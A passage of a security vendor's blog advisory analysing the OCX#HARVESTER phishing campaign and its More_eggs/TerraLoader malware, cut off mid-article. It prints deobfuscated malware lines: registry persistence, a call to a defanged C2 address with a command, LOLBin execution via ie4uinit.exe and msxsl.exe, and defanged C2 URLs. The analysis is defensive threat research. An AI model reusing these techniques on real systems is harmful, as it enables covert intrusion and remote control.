url('https://www.securonix.com/wp-content/uploads/avia_fonts/securonix-icons/securonix-icons.svg?ver=1.2.83#securonix-icons') format('svg'),
url('https://www.securonix.com/wp-content/uploads/avia_fonts/securonix-icons/securonix-icons.eot?ver=1.2.83'),
url('https://www.securonix.com/wp-content/uploads/avia_fonts/securonix-icons/securonix-icons.eot?ver=1.2.83#iefix') format('embedded-opentype');
} #top .avia-font-securonix-icons, body .avia-font-securonix-icons, html body [data-av_iconfont='securonix-icons']:before{ font-family: 'securonix-icons'; }
</style>

		</ul>
</li>
	</ul>
</li>
	<li role="menuitem" id="menu-item-14738" class="featured-menu menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children avia_mega_menu_columns_2 three units avia_mega_menu_columns_last">
	<ul role="menu" class="sub-menu">
		<li role="menuitem" id="menu-item-25111" class="menu-item menu-item-type-custom menu-item-object-custom"><div class="menu-item-template-part"><div  class='ep-posts-grid-container ep-grid-wrapper ep-space-small   header--featured-post '  ><div class='ep-posts-grid ep-grid  ep-grid-columns  is-variable is-3 '><div class="ep-item ep-posts-grid-item  ep-post-grid-item ep-grid-column one-full-mobile one-full-tablet one-full  entry entry-26698 entry-resources   ep-item-has-button " >
    <div class="ep-item-inner   ">
                        <div class="ep-item-media">
            <div class="ep-item-image">
                <a class='noHover' href='https://www.securonix.com/resources/securonix-eon-a-new-era-of-aireinforced-cyberops/' >                    <img decoding="async" width="740" height="448" src="https://www.securonix.com/wp-content/uploads/2024/04/Securonix-EON-Data-Sheet-Featured-Image-–-1.png" class="avia-img-lazy-loading-30124 attachment-post-thumbnail size-post-thumbnail" alt="securonix EON 3D chip illustration" loading="lazy" />                </a>            </div>
        </div>
                <div class="ep-item-contents">
            
            
                        <div class="ep-item-title-wrapper ">

		<li role="menuitem" id="menu-item-14716" class="menu-title menu-item menu-item-type-custom menu-item-object-custom"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">Featured Use Case</span></span></li>

		<li role="menuitem" id="menu-item-14696" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children"><a class="menu-item-inner" href="https://www.securonix.com/solutions/use-case/network-detection-and-response/" tabindex="0"><span class="avia-menu-text">NDR</span></a>
		<ul role="menu" class="sub-menu">
			<li role="menuitem" id="menu-item-25108" class="avia_mega_text_block menu-item menu-item-type-custom menu-item-object-custom">Analyze network events to detect and respond to advanced threats.</li>
		</ul>
</li>
		<li role="menuitem" id="menu-item-14721" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children"><a class="menu-item-inner" href="https://www.securonix.com/products/securonix-for-emr-security/" tabindex="0"><span class="avia-menu-text">EMR Monitoring</span></a>
		<ul role="menu" class="sub-menu">
			<li role="menuitem" id="menu-item-25109" class="avia_mega_text_block menu-item menu-item-type-custom menu-item-object-custom">Increase patient data privacy and prevent data snooping.</li>
		</ul>
</li>
		<li role="menuitem" id="menu-item-23313" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children"><a class="menu-item-inner" href="https://www.securonix.com/solutions/use-case/mitre/" tabindex="0"><span class="avia-menu-text">MITRE ATT&#038;CK</span></a>
		<ul role="menu" class="sub-menu">
			<li role="menuitem" id="menu-item-25110" class="avia_mega_text_block menu-item menu-item-type-custom menu-item-object-custom">Align alerts and analytics to the MITRE ATT&CK framework.</li>
		</ul>
</li>
	</ul>
</li>
	<li role="menuitem" id="menu-item-14722" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children avia_mega_menu_columns_3 three units avia_mega_menu_columns_last">
	<ul role="menu" class="sub-menu">
		<li role="menuitem" id="menu-item-14723" class="menu-title menu-item menu-item-type-custom menu-item-object-custom"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">Industries</span></span></li>
		<li role="menuitem" id="menu-item-14724" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.securonix.com/solutions/industries/financial-services/" tabindex="0"><span class="avia-menu-text">Financial Services</span></a></li>
		<li role="menuitem" id="menu-item-14725" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.securonix.com/solutions/industries/healthcare/" tabindex="0"><span class="avia-menu-text">Healthcare</span></a></li>
	</ul>
</li>
</ul>

</div>
</li>
<li role="menuitem" id="menu-item-14727" class="normal-view menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-mega-parent  menu-item-top-level menu-item-top-level-4"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">Resources</span></span>
<div class='avia_mega_div avia_mega2 six units'>

<ul role="menu" class="sub-menu">
	<li role="menuitem" id="menu-item-14728" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children avia_mega_menu_columns_2 three units  avia_mega_menu_columns_first">
	<ul role="menu" class="sub-menu">
		<li role="menuitem" id="menu-item-14729" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.securonix.com/resource-library/" tabindex="0"><span class="avia-menu-text">Resource Library</span></a></li>
		<li role="menuitem" id="menu-item-20857" class="menu-item menu-item-type-custom menu-item-object-custom"><a class="menu-item-inner" href="https://www.securonix.com/resources/?_asset_type=case-studies" tabindex="0"><span class="avia-menu-text">Case Studies</span></a></li>
		<li role="menuitem" id="menu-item-14730" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children"><a class="menu-item-inner" href="https://www.securonix.com/resources/" tabindex="0"><span class="avia-menu-text">Resources by Topic</span></a>
		<ul role="menu" class="sub-menu">
			<li role="menuitem" id="menu-item-14731" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.securonix.com/resources-by-topic/siem/" tabindex="0"><span class="avia-menu-text">SIEM</span></a></li>
			<li role="menuitem" id="menu-item-14732" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.securonix.com/resources-by-topic/ueba/" tabindex="0"><span class="avia-menu-text">UEBA</span></a></li>
			<li role="menuitem" id="menu-item-14733" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.securonix.com/resources-by-topic/cloud-security/" tabindex="0"><span class="avia-menu-text">Cloud Security</span></a></li>
			<li role="menuitem" id="menu-item-14734" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.securonix.com/resources-by-topic/insider-threat/" tabindex="0"><span class="avia-menu-text">Insider Threat</span></a></li>
			<li role="menuitem" id="menu-item-14735" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.securonix.com/resources-by-topic/information-security/" tabindex="0"><span class="avia-menu-text">Information Security</span></a></li>
			<li role="menuitem" id="menu-item-14736" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.securonix.com/resources-by-topic/security-analytics/" tabindex="0"><span class="avia-menu-text">Security Analytics</span></a></li>
		</ul>
</li>
	</ul>
</li>
	<li role="menuitem" id="menu-item-14738" class="featured-menu menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children avia_mega_menu_columns_2 three units avia_mega_menu_columns_last">
	<ul role="menu" class="sub-menu">
		<li role="menuitem" id="menu-item-25111" class="menu-item menu-item-type-custom menu-item-object-custom"><div class="menu-item-template-part"><div  class='ep-posts-grid-container ep-grid-wrapper ep-space-small   header--featured-post '  ><div class='ep-posts-grid ep-grid  ep-grid-columns  is-variable is-3 '><div class="ep-item ep-posts-grid-item  ep-post-grid-item ep-grid-column one-full-mobile one-full-tablet one-full  entry entry-26698 entry-resources   ep-item-has-button " >
    <div class="ep-item-inner   ">
                        <div class="ep-item-media">
            <div class="ep-item-image">
                <a class='noHover' href='https://www.securonix.com/resources/securonix-eon-a-new-era-of-aireinforced-cyberops/' >                    <img decoding="async" width="740" height="448" src="https://www.securonix.com/wp-content/uploads/2024/04/Securonix-EON-Data-Sheet-Featured-Image-–-1.png" class="avia-img-lazy-loading-30124 attachment-post-thumbnail size-post-thumbnail" alt="securonix EON 3D chip illustration" loading="lazy" />                </a>            </div>
        </div>
                <div class="ep-item-contents">
            
            
                        <div class="ep-item-title-wrapper ">
            <h4 class="ep-item-title av-special-heading-tag" >
                <a class='noHover' href='https://www.securonix.com/resources/securonix-eon-a-new-era-of-aireinforced-cyberops/' >                    Securonix EON: A New Era of AI–Reinforced CyberOps                </a>            </h4>
            </div>
            
            
                            <div class="ep-item-button-wrapper">
                    <a href="https://www.securonix.com/resources/securonix-eon-a-new-era-of-aireinforced-cyberops/"  class="avia-button avia-style-arrow avia-color-default avia-size-large">
                        <span class="avia_iconbox_title">Learn More</span>
                    </a>
                </div>
                    </div>
            </div>
</div>
</div></div></div></li>
	</ul>
</li>
</ul>

</div>
</li>
<li role="menuitem" id="menu-item-14740" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-top-level menu-item-top-level-5"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">Partners</span></span>


<ul role="menu" class="sub-menu">
	<li role="menuitem" id="menu-item-26497" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.securonix.com/partners/" tabindex="0"><span class="avia-menu-text">Partner Overview</span></a></li>
	<li role="menuitem" id="menu-item-14745" class="menu-item menu-item-type-custom menu-item-object-custom"><a class="menu-item-inner" href="https://www.securonix.com/partners/solution-providers/" tabindex="0"><span class="avia-menu-text">Solution Providers</span></a></li>
	<li role="menuitem" id="menu-item-14743" class="menu-item menu-item-type-custom menu-item-object-custom"><a class="menu-item-inner" href="https://www.securonix.com/partners/managed-security-service-providers/" tabindex="0"><span class="avia-menu-text">MSSPs</span></a></li>
	<li role="menuitem" id="menu-item-14744" class="menu-item menu-item-type-custom menu-item-object-custom"><a class="menu-item-inner" href="https://www.securonix.com/partners/global-system-integrators/" tabindex="0"><span class="avia-menu-text">System Integrators</span></a></li>

	<li role="menuitem" id="menu-item-30122" class="menu-item menu-item-type-custom menu-item-object-custom"><a class="menu-item-inner" href="https://partners.securonix.com/" tabindex="0"><span class="avia-menu-text">Partner Portal Login</span></a></li>

<ul role="menu" class="sub-menu">

<li role="menuitem" id="menu-item-29657" class="hide-on-desktop menu-item menu-item-type-post_type menu-item-object-page av-menu-button av-menu-button-bordered menu-item-top-level menu-item-top-level-7"><a class="menu-item-inner" href="https://www.securonix.com/blog/" tabindex="0"><span class="avia-menu-text">Blog</span></a></li>

<li role="menuitem" id="menu-item-3645" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-top-level menu-item-top-level-3"><a class="menu-item-inner" href="https://www.securonix.com/contact-us/" tabindex="0"><span class="avia-menu-text">Contact Us</span></a></li>
<li role="menuitem" id="menu-item-3644" class="menu-button menu-item menu-item-type-post_type menu-item-object-page menu-item-top-level menu-item-top-level-4"><a class="menu-item-inner" href="https://www.securonix.com/request-a-demo/" tabindex="0"><span class="avia-menu-text">Request a Demo</span></a></li>
<li style="position:relative;" class="menu-item menu-item-gtranslate gt-menu-16005"></li></ul></div>			<div class="header-social-container">
				<div class='noLightbox social_bookmarks icon_count_3'><div class='social_bookmarks_linkedin av-social-link-linkedin social_icon_1'><a target="_blank" aria-label="Link to Linkedin" href='https://in.linkedin.com/company/securonix' aria-hidden='false' data-av_icon='' data-av_iconfont='fa-fontello' title='Linkedin' rel="noopener"><span class='avia_hidden_link_text'>Linkedin</span></a></div><div class='social_bookmarks_twitter av-social-link-twitter social_icon_2'><a target="_blank" aria-label="Link to Twitter" href='https://twitter.com/Securonix' aria-hidden='false' data-av_icon='' data-av_iconfont='entypo-fontello' title='Twitter' rel="noopener"><span class='avia_hidden_link_text'>Twitter</span></a></div><div class='social_bookmarks_youtube av-social-link-youtube social_icon_3'><a target="_blank" aria-label="Link to Youtube" href='https://www.youtube.com/@securonix' aria-hidden='false' data-av_icon='' data-av_iconfont='fa-fontello' title='Youtube' rel="noopener"><span class='avia_hidden_link_text'>Youtube</span></a></div></div>			</div>
		</div>
	</div>
</div>
	<div id='main' class='all_colors' data-scroll-offset='88'>

	
<div  class="single-content-section single-hero-section avia-section alternate_color avia-section-default avia-no-border-styling container_wrap fullsize avia-builder-el-0 avia-builder-el-first">
	<div class="hero-overlay">
					<img fetchpriority="high" src="https://www.securonix.com/wp-content/uploads/2022/03/hero-coverage-advisory-okta-breach-1440x227-1.png" alt="">
			</div>
	<div class="container">
		<div class="content">
			<div class="entry-content-wrapper">
				<div class="single-post-header">
					<div class="single-post-meta-data">
																			<span class="single-post-type">Blog</span>
											</div>
					<h1 class="single-post-heading av-special-heading-tag">Securonix Threat Labs Security Advisory: New OCX#HARVESTER Attack Campaign Leverages a Modernized More_eggs Suite to Target Victims</h1>

					
					<div class="single-post-tag">
																				<span>Threat Research</span>
											</div>

				</div>
			</div>
        </div>
	</div>
</div>

<div  class="single-content-section avia-section main_color avia-section-small avia-no-border-styling container_wrap fullsize">
	<div class="container">
		<div class="content">
			<div class="entry-content-wrapper">		
										<div class="single-content"> 
					<div class="single-social-share">
						<span>Share</span>
						<div class="addtoany_shortcode"><div class="a2a_kit a2a_kit_size_32 addtoany_list" data-a2a-url="https://www.securonix.com/blog/threat-labs-security-advisory-new-ocxharvester-attack-campaign-leverages-modernized-more_eggs-suite/" data-a2a-title="Securonix Threat Labs Security Advisory: New OCX#HARVESTER Attack Campaign Leverages Modernized More_eggs Suite to Target Victims"><a class="a2a_button_linkedin" href="https://www.addtoany.com/add_to/linkedin?linkurl=https%3A%2F%2Fwww.securonix.com%2Fblog%2Fthreat-labs-security-advisory-new-ocxharvester-attack-campaign-leverages-modernized-more_eggs-suite%2F&amp;linkname=Securonix%20Threat%20Labs%20Security%20Advisory%3A%20New%20OCX%23HARVESTER%20Attack%20Campaign%20Leverages%20Modernized%20More_eggs%20Suite%20to%20Target%20Victims" title="LinkedIn" rel="nofollow noopener" target="_blank"></a><a class="a2a_button_x" href="https://www.addtoany.com/add_to/x?linkurl=https%3A%2F%2Fwww.securonix.com%2Fblog%2Fthreat-labs-security-advisory-new-ocxharvester-attack-campaign-leverages-modernized-more_eggs-suite%2F&amp;linkname=Securonix%20Threat%20Labs%20Security%20Advisory%3A%20New%20OCX%23HARVESTER%20Attack%20Campaign%20Leverages%20Modernized%20More_eggs%20Suite%20to%20Target%20Victims" title="X" rel="nofollow noopener" target="_blank"></a><a class="a2a_dd addtoany_share_save addtoany_share" href="https://www.addtoany.com/share"></a></div></div>					</div>
												<section class="component component-wysisyg">
								<div class="container-inner">
									<div class="row-inner">
										<div class="">
											<div class="text-block bullets-listing">
											<p><span style="font-weight: 400;">By Securonix Threat Labs, Threat Research: Den Iuzvyk, Tim Peck, Oleg Kolesnikov</span></p>
<h2><span style="font-weight: 400;">TL;DR </span></h2>
<p><span style="font-weight: 400;">The Securonix Threat Research team (STR) has recently observed a new attack campaign tracked by Securonix as OCX#HARVESTER. Some of the malicious payloads leveraged as part of the attack campaign observed appear to be related to the More_eggs malicious payloads reported earlier [1]. The naming of some of the collected samples as well as some of the lure images suggest that the targets in this campaign are directly or indirectly related to the financial sector, especially those involved in cryptocurrencies.</span></p>
<p><span style="font-weight: 400;">The payloads in this attack campaign were observed by STR in the wild mostly between December 2022 through March of this year. There were multiple victims targeted and exploited by the attackers as part of the campaign.</span></p>
<p><span style="font-weight: 400;">Some of our observations about this attack campaign and possible ways to detect it are described below. It is likely that at this point the attacks continue along with new targets and malware delivery methods. We also observed that C2 communication has shifted to a new infrastructure, which we will also dive into further down.</span></p>
<h2><span style="font-weight: 400;">Attack chain overview</span></h2>
<p><span style="font-weight: 400;">As with most external attacks, phishing emails containing a malicious compressed zip file appears to be the primary delivery method. The email attachment file analyzed by our team (screenshots-9201.jpg.zip) contains two shortcut files <span style="color: #ff0000;">“</span></span><span style="font-weight: 400; color: #ff0000;">Screenshot-9501.JPG.lnk</span><span style="font-weight: 400;"><span style="color: #ff0000;">”</span> and <span style="color: #ff0000;">“</span></span><span style="font-weight: 400; color: #ff0000;">Screenshot-9502.JPG.lnk</span><span style="font-weight: 400;"><span style="color: #ff0000;">”</span> disguised as jpeg. This particular lure method is quite common and was recently seen during the </span><a href="https://www.securonix.com/blog/security-advisory-python-based-pyration-attack-campaign/"><span style="font-weight: 400;">PY#RATION attack campaign</span></a><span style="font-weight: 400;"> discovered earlier this year. </span></p>
<p><span style="font-weight: 400;">Diving in a bit deeper into the initial code execution from the two LNK files, we can see that the shortcut file links to<span style="color: #ff0000;"> “</span></span><span style="font-weight: 400; color: #ff0000;">C:\Windows\System32\cmd.exe</span><span style="font-weight: 400;"><span style="color: #ff0000;">”</span> along with a large chunk of obfuscated command line.</span></p>
<h3><span style="font-weight: 400;">.LNK file execution</span></h3>
<p><span style="font-weight: 400;">The two image lures take the appearance of a general image icon as it is pulled from the &#8220;Windows Image Resource&#8221; file (imageres.dll) which contains a library of icons for files and folders.</span></p>
<p><a href="https://www.securonix.com/wp-content/uploads/2023/04/644157ce42f0d.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="alignnone wp-image-20128 size-full" src="https://www.securonix.com/wp-content/uploads/2023/04/644157ce42f0d.png" alt="" width="1600" height="956" /></a></p>
<p><span style="font-weight: 400;">Figure 1: [OCX#HARVESTER] Shortcut .lnk file lure (Screenshot-9502.JPG.lnk)</span></p>
<p><span style="font-weight: 400;">Taking a closer look at the two .lnk files, there is some obvious and apparent CMD obfuscation passed in as command line parameters along with the call to cmd.exe as seen in the figure below. </span></p>
<p><a href="https://www.securonix.com/wp-content/uploads/2023/04/6441580b33d7d.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="alignnone wp-image-20168 size-full" src="https://www.securonix.com/wp-content/uploads/2023/04/6441580b33d7d.png" alt="" width="1600" height="956" /></a></p>
<p><span style="font-weight: 400;">Figure 2: [OCX#HARVESTER] Shortcut .lnk file analysis</span></p>
<p><span style="font-weight: 400;">The obfuscated command line performs a couple functions which sets the stage for binary file proxy execution. This is done by using a </span><a href="https://lolbas-project.github.io/lolbas/Binaries/Ie4uinit/"><span style="font-weight: 400;">common LOLbin technique</span></a><span style="font-weight: 400;"> which leverages the Windows binary file Ie4uinit.exe. First, it copies that file to the </span><span style="font-weight: 400; color: #ff0000;">%tmp%\</span><span style="font-weight: 400;"> directory. Next, it creates a file in the same directory called ieuinit.inf. Most of the command line is populating that file with the needed parameters to execute the next stage of the attack.</span></p>
<p><a href="https://www.securonix.com/wp-content/uploads/2023/04/644158112559a.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="alignnone wp-image-20172 size-full" src="https://www.securonix.com/wp-content/uploads/2023/04/644158112559a.png" alt="" width="1600" height="956" /></a></p>
<p><span style="font-weight: 400;">Figure 3: [OCX#HARVESTER] Staging the Ie4uinit.exe LOLBin</span></p>
<h3><span style="font-weight: 400;">LOLBin usage: ie4uinit.exe</span></h3>
<p><span style="font-weight: 400;">In summary, the Ie4uinit.exe LOLbin attack works by copying the Ie4uinit.exe executable out of the </span><span style="font-weight: 400; color: #ff0000;">C:\Windows\System32\</span><span style="font-weight: 400;"> directory and placing it into a writable directory chosen by the attacker. In this case, the user’s </span><span style="font-weight: 400; color: #ff0000;">%TMP%</span><span style="font-weight: 400;"> directory. By default this is typically </span><span style="font-weight: 400; color: #ff0000;">C:\Users\user\Appdata\Local\Temp\</span><span style="font-weight: 400;">. </span></p>
<p><span style="font-weight: 400;">Once copied, a new file is created within the same directory called ieuinit.inf. For the attack to work, this file contains a directive which calls a section named <span style="color: #ff0000;">“</span></span><span style="font-weight: 400; color: #ff0000;">DefaultInstall.Windows7</span><span style="font-weight: 400;"><span style="color: #ff0000;">”</span>. This then initiates [F07FD]  which is where we find the reference to the scrobj.dll/SCT payload (robots.php in our case). </span></p>
<p><a href="https://www.securonix.com/wp-content/uploads/2023/04/64415817634b8.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="alignnone wp-image-20176 size-full" src="https://www.securonix.com/wp-content/uploads/2023/04/64415817634b8.png" alt="" width="1600" height="956" /></a></p>
<p><span style="font-weight: 400;">Figure 4: [OCX#HARVESTER] &#8211; deobfuscated ieuinit.inf file</span></p>
<p><span style="font-weight: 400;">The next step is to execute the moved (or in some cases moved and renamed) binary Ie4uinit.exe and the required command line. In our case, </span><span style="font-weight: 400; color: #ff0000;">START /min</span><span style="font-weight: 400;"> was utilized along with </span><span style="color: #ff0000;"><span style="font-weight: 400;">wmic process call create</span><span style="font-weight: 400;">:</span></span></p>
<p><span style="font-weight: 400; color: #ff0000;">start  /MIN wmic process call create &#8220;%tmp%\ie4uinit.exe -basesettings&#8221;</span></p>
<p><span style="font-weight: 400;">When the above command is executed, the process ie4uinit.exe reads the contents of the local ieuinit.inf file. The referenced scrobj.dll/SCT payload is downloaded and any embedded scripts will be executed on the system.</span></p>
<p><span style="font-weight: 400;">Let’s next examine the contents of the robots.php file which will take us into the second stage of the attack.</span></p>
<h3><span style="font-weight: 400;">Robots.php(sct) </span></h3>
<p><span style="font-weight: 400;">At this stage of the attack the attackers have achieved code execution and are looking to advance their foodhold. This is historically where TerraLoader comes into play within the More_eggs attack chain. Similar to </span><a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Additional%20Analysis/Terraloader/02-01-20/Analysis.md"><span style="font-weight: 400;">what has been observed in the past</span></a><span style="font-weight: 400;">, TerraLoader is a heavily obfuscated JavaScript loader which allows for command and control (C2) functionality on the affected host.</span></p>
<p><a href="https://www.securonix.com/wp-content/uploads/2023/04/6441581d2e87c.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="alignnone wp-image-20180 size-full" src="https://www.securonix.com/wp-content/uploads/2023/04/6441581d2e87c.png" alt="" width="1600" height="956" /></a></p>
<p><span style="font-weight: 400;">Figure 5: [OCX#HARVESTER] &#8211; robots.php obfuscation example</span></p>
<p><span style="font-weight: 400;">In this particular sample, the level of obfuscation is pretty extreme. As seen in the figure above, the script is full of character substitution, randomly generated variables and broken apart strings. </span></p>
<p><span style="font-weight: 400;">After deobfuscating the script, we’re able to better understand its capabilities. Some of these include:</span></p>
<ul>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">Persistence: Establish a registry foothold:</span><span style="font-weight: 400;"><br />
</span><span style="font-weight: 400; color: #ff0000;">ActXobj1.RegWrite(&#8220;HKCU\\Environment\\UserInitMprLogonScript&#8221;, &#8216;cscript /b /e:jscript &#8220;%APPDATA%\\Microsoft\\&#8217; + PersFileName + &#8216;&#8221;&#8216;);</span></li>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">Establish connection to C2 server:</span><span style="font-weight: 400;"><br />
</span><span style="font-weight: 400; color: #ff0000;">ConnectionLite.open(&#8220;GET&#8221;, &#8220;hxxp://95.179.186[.]167/Writer.php?deploy=&#8221; + CommandToRun, false);</span></li>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">Command execution using Msxsl.exe:</span><span style="font-weight: 400;"><br />
</span><span style="font-weight: 400; color: #ff0000;">CommandToRun = &#8216;cmd /c start /min &#8220;&#8221; &#8220;&#8216; + MsxslPath + &#8216;&#8221; &#8220;&#8216; + DropperPath + LoaderFileName + &#8216;&#8221;&#8216; + &#8216; &#8220;&#8216; + DropperPath + LoaderFileName + &#8216;&#8221;&#8216;;</span></li>
</ul>
<p><span style="font-weight: 400;">The loader script shifts gears and starts to stage inside the </span><span style="font-weight: 400;">%APPDATA%\Microsoft\</span><span style="font-weight: 400;"> directory. Two new files are created: “ZUW0Y1NVRZ6LIIHFO2AQNHTX.txt” and “QVB3WZXVQG6G8O7V.txt”. Both of these files serve a unique purpose and once again contain heavily obfuscated JavaScript code. </span></p>
<p><span style="font-weight: 400; color: #ff0000;">var DropperPath = WScriptShell.ExpandEnvironmentStrings(&#8220;%appdata%&#8221;);</span></p>
<p><span style="font-weight: 400; color: #ff0000;">DropperPath = DropperPath + &#8220;\\Microsoft\\&#8221;;</span></p>
<p><span style="font-weight: 400; color: #ff0000;">var LoaderFileName = &#8220;ZUW0Y1NVRZ6LIIHFO2AQNHTX.txt&#8221;;</span></p>
<p><span style="font-weight: 400; color: #ff0000;">var PersFileName = &#8220;QVB3WZXVQG6G8O7V.txt&#8221;;</span></p>
<p><span style="font-weight: 400; color: #ff0000;">var MsxslPath = DropperPath + gVKMduVwicY669(KngnfjMhu502, JYUyEnBGkSSrXUy905);</span></p>
<h3><span style="font-weight: 400;">LOLBin usage: msxsl.exe</span></h3>
<p><span style="font-weight: 400;">To execute further stagers and maintain persistence, the Windows binary msxsl.exe is used to ensure script execution success. </span><a href="https://lolbas-project.github.io/lolbas/OtherMSBinaries/Msxsl/"><span style="font-weight: 400;">This particular LOLBin</span></a><span style="font-weight: 400;"> allows the code to bypass application whitelisting restrictions such as AppLocker. Code such as JavaScript, VBscript, or JScript contained inside an expected .xsl file (or any XML formatted file) can be executed regardless of application restrictions.</span></p>
<p><span style="font-weight: 400;">Similar to that of the previous LOLbin example using ie4uinit.exe, msxsl.exe is executed from the attacker controlled directory in </span><span style="font-weight: 400; color: #ff0000;">%APPDATA%\Microsoft\</span><span style="font-weight: 400;">.</span></p>
<p><span style="font-weight: 400;">By default, msxsl.exe does not exist on most Windows operating systems. However, since the binary file is extremely lightweight, </span><b>the entire msxsl.exe binary is compiled from raw hex values contained inside the robots.php script</b><span style="font-weight: 400;">.</span></p>
<p><a href="https://www.securonix.com/wp-content/uploads/2023/04/64415823094b6.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="alignnone wp-image-20184 size-full" src="https://www.securonix.com/wp-content/uploads/2023/04/64415823094b6.png" alt="" width="1600" height="956" /></a></p>
<p><span style="font-weight: 400;">Figure 6: [OCX#HARVESTER] &#8211; building the msxsl.exe binary from JavaScript (deobfuscated)</span></p>
<p><span style="font-weight: 400;">The written msxsl.exe binary, standing at a mere 24KB, appears to pass integrity checks and is digitally signed from Microsoft Corporation. This file along with “ZUW0Y1NVRZ6LIIHFO2AQNHTX.txt” and “QVB3WZXVQG6G8O7V.txt” are written to disk upon the execution of robots.php. </span></p>
<p><a href="https://www.securonix.com/wp-content/uploads/2023/04/6441582aa9b39.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="alignnone wp-image-20188 size-full" src="https://www.securonix.com/wp-content/uploads/2023/04/6441582aa9b39.png" alt="" width="1600" height="195" /></a></p>
<p><span style="font-weight: 400;">Figure 7: [OCX#HARVESTER] &#8211; initial compromise infection process tree</span></p>
<p><a href="https://www.securonix.com/wp-content/uploads/2023/04/6441582eb6908.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="alignnone wp-image-20192 size-full" src="https://www.securonix.com/wp-content/uploads/2023/04/6441582eb6908.png" alt="" width="1600" height="956" /></a></p>
<p><span style="font-weight: 400;">Figure 8: [OCX#HARVESTER] &#8211; built msxsl.exe binary details</span></p>
<p><span style="font-weight: 400;">As you’ll see, this LOLbin technique will be used quite often in the next stage of the attack.</span></p>
<h3><span style="font-weight: 400;">JScript Execution (ZUW0Y1NVRZ6LIIHFO2AQNHTX.txt)</span></h3>
<p><span style="font-weight: 400;">This phase of the attack is kicked off by robots.php using the following command:</span></p>
<p><span style="font-weight: 400; color: #ff0000;">msxsl.exe </span></p>
<p><span style="font-weight: 400; color: #ff0000;">&#8220;C:\Users\redacted\AppData\Roaming\Microsoft\ZUW0Y1NVRZ6LIIHFO2AQNHTX.txt&#8221; </span></p>
<p><span style="font-weight: 400; color: #ff0000;">&#8220;C:\Users\redacted\AppData\Roaming\Microsoft\ZUW0Y1NVRZ6LIIHFO2AQNHTX.txt&#8221;</span></p>
<p><span style="font-weight: 400;">This file, as per the current trend, is also heavily obfuscated in an attempt to circumvent detection engines. The obfuscation methods in this particular file are very similar to what we saw in robots.php.</span></p>
<p><span style="font-weight: 400;">Taking the time to deobfuscate the file gives us some insight into this stager’s capabilities.</span></p>
<h4><span style="font-weight: 400;">Command and Control [T1071.001]</span></h4>
<p><span style="font-weight: 400;">C2 communication is established by creating a new </span><a href="https://learn.microsoft.com/en-us/openspecs/ie_standards/ms-es5ex/64528856-d0ab-4639-a8a0-625040a88c93"><span style="font-weight: 400;">ActiveXObject</span></a><span style="font-weight: 400;"> object and one of several XMLHTTP objects to establish a connection to the attacker’s remote server. In this particular sample we observed the following URL being used:</span></p>
<p><span style="font-weight: 400; color: #ff0000;">hxxps://telemistry[.]net/reg.php?g=</span></p>
<p><span style="font-weight: 400; color: #ff0000;">hxxps://telemistry[.]net/get.php?g=</span></p>
<p><span style="font-weight: 400;">Connections are established using a GET request which is sent along with some general host information such as user name, computer name, and domain. </span></p>
<p><a href="https://www.securonix.com/wp-content/uploads/2023/04/64415834363bd.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="alignnone wp-image-20196 size-full" src="https://www.securonix.com/wp-content/uploads/2023/04/64415834363bd.png" alt="" width="1600" height="956" /></a></p>
<p><span style="font-weight: 400;">Figure 9: [OCX#HARVESTER] &#8211; ZUW0Y1NVRZ6LIIHFO2AQNHTX.txt: C2 connection strings</span></p>
<h4><span style="font-weight: 400;">Execution using WMI [T1047]</span></h4>
<p><span style="font-weight: 400;">Commands and other processes can also be executed using Windows Management Instrumentation (WMI) infrastructure. </span></p>
<p><a href="https://www.securonix.com/wp-content/uploads/2023/04/644157d401add.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="alignnone wp-image-20132 size-full" src="https://www.securonix.com/wp-content/uploads/2023/04/644157d401add.png" alt="" width="1600" height="956" /></a></p>
<p><span style="font-weight: 400;">Figure 10: [OCX#HARVESTER] &#8211; ZUW0Y1NVRZ6LIIHFO2AQNHTX.txt: WMI command execution</span></p>
<h4><span style="font-weight: 400;">Long sleeps [T1497.003]</span></h4>
